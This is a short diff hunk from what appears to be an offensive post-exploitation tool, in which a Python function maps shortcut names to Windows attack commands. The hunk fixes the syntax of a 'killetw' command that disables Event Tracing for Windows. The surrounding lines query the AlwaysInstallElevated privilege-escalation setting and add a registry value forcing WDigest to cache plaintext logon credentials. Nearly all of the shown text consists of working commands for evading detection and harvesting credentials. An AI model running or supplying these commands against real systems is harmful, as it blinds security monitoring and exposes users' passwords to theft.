@@ -68,7 +68,7 @@ def postExpShell():
             return "powershell.exe -c 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated'"
 
         elif user_input.lower() == "killetw":
-            return "COMPlus_ETWEnabled = 0"
+            return "set COMPlus_ETWEnabled = 0"
 
         elif user_input.lower() == "wdigest-downgrade":
             return "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
